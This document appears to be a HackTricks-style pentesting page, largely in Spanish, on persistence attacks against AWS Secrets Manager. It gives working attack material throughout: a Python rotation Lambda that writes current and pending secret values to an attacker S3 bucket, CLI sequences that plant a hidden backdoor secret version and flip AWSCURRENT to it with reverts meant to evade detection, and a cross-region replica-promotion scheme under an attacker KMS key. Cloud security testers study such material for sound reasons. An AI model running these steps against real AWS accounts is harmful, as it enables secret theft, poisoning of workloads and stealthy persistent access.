# AWS - Secrets Manager Persistencia

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Para más información consulta:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### A través de políticas de recursos

Es posible **conceder acceso a secretos a cuentas externas** vía políticas de recursos. Check the [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) for more information. Ten en cuenta que para **acceder a un secreto**, la cuenta externa también **necesitará acceso a la clave KMS que cifra el secreto**.

### A través de Secrets Rotate Lambda

Para **rotar secretos** automáticamente se invoca una **Lambda** configurada. Si un atacante pudiera **cambiar** el **código**, podría directamente **exfiltrar el nuevo secreto** a sí mismo.

Así podría verse el código de la Lambda para tal acción:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}





### Intercambiar la Lambda de rotación por una función controlada por el atacante mediante RotateSecret

Abusar de `secretsmanager:RotateSecret` para reasignar un secret a una Lambda de rotación controlada por el atacante y forzar una rotación inmediata. La función maliciosa exfiltrates las versiones del secreto (AWSCURRENT/AWSPENDING) durante los pasos de rotación (createSecret/setSecret/testSecret/finishSecret) hacia un attacker sink (por ejemplo, S3 o HTTP externo).

- Requisitos
- Permisos: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` on the attacker Lambda, `iam:CreateRole/PassRole/PutRolePolicy` (or AttachRolePolicy) para aprovisionar el rol de ejecución de la Lambda con `secretsmanager:GetSecretValue` y preferiblemente `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (para que la rotación siga funcionando), KMS `kms:Decrypt` para la clave KMS del secreto, y `s3:PutObject` (o outbound egress) para exfiltration.
- Un target secret id (`SecretId`) con rotación habilitada o la capacidad de habilitar la rotación.

- Impacto
- El atacante obtiene el/los valor(es) del secreto sin modificar el código legítimo de rotación. Solo se cambia la configuración de rotación para apuntar a la Lambda del atacante. Si no se detecta, las rotaciones programadas futuras seguirán invocando la función del atacante.

- Pasos del ataque (CLI)
1) Preparar el attacker sink y el rol de Lambda
- Crear un bucket S3 para exfiltration y un rol de ejecución confiado por Lambda con permisos para leer el secreto y escribir en S3 (además de logs/KMS según sea necesario).
2) Desplegar la Lambda del atacante que en cada paso de rotación obtiene el/los valor(es) del secreto y los escribe en S3. La lógica mínima de rotación puede simplemente copiar AWSCURRENT a AWSPENDING y promoverlo en finishSecret para mantener el servicio sano.
3) Reasignar la rotación y forzarla
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) Verificar la exfiltration listando el prefijo S3 para ese secreto e inspeccionando los artefactos JSON.
5) (Opcional) Restaurar la Lambda de rotación original para reducir la detección.

- Ejemplo de Lambda del atacante (Python) exfiltrating to S3
- Entorno: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Abuse Secrets Manager version staging labels to plant an attacker-controlled secret version and keep it hidden under a custom stage (for example, `ATTACKER`) while production continues to use the original `AWSCURRENT`. En cualquier momento, mueve `AWSCURRENT` a la versión del atacante para envenenar las cargas de trabajo dependientes, y luego restáuralo para minimizar la detección. Esto proporciona persistencia encubierta tipo backdoor y manipulación rápida en el momento de uso sin cambiar el nombre del secreto ni la configuración de rotación.

- Requisitos
- Permisos: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (for verification)
- ID del secreto objetivo en la Región.

- Impacto
- Mantener una versión oculta y controlada por el atacante de un secreto y voltear atómicamente `AWSCURRENT` a ella bajo demanda, influyendo en cualquier consumidor que resuelva el mismo nombre de secreto. El volteo y la rápida reversión reducen la probabilidad de detección mientras permiten la compromiso en el momento de uso.

- Pasos del ataque (CLI)
- Preparación
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>Comandos CLI</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Notas
- Cuando suministras `--client-request-token`, Secrets Manager lo usa como el `VersionId`. Al agregar una nueva versión sin establecer explícitamente `--version-stages`, `AWSCURRENT` pasa a la nueva versión por defecto y marca la anterior como `AWSPREVIOUS`.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Abusa de la replicación multi-región de Secrets Manager para crear una réplica de un secret objetivo en una región menos monitorizada, cifrarla con una clave KMS controlada por el atacante en esa región, luego promover la réplica a un secret independiente y adjuntar una política de recursos permisiva que otorgue al atacante acceso de lectura. El secret original en la región primaria permanece sin cambios, proporcionando un acceso duradero y sigiloso al valor del secret a través de la réplica promovida mientras se eluden las restricciones de KMS/policies en el primario.

- Requisitos
- Permisos: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- En la región de réplica: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (o `kms:PutKeyPolicy`) para permitir que el principal atacante realice `kms:Decrypt`.
- Un principal atacante (usuario/rol) que reciba acceso de lectura al secret promovido.

- Impacto
- Ruta de acceso persistente entre regiones al valor del secret a través de una réplica independiente bajo un CMK de KMS controlado por el atacante y una política de recursos permisiva. El secret primario en la región original queda intacto.

- Ataque (CLI)
- Variables
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Crear una KMS key controlada por el atacante en la Región réplica
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) Replicar el secret a R2 usando la clave KMS del atacante
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) Promover la réplica a una instancia independiente en R2
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) Adjuntar una política de recursos permisiva al secreto independiente en R2
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) Leer el secret desde el attacker principal en R2
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

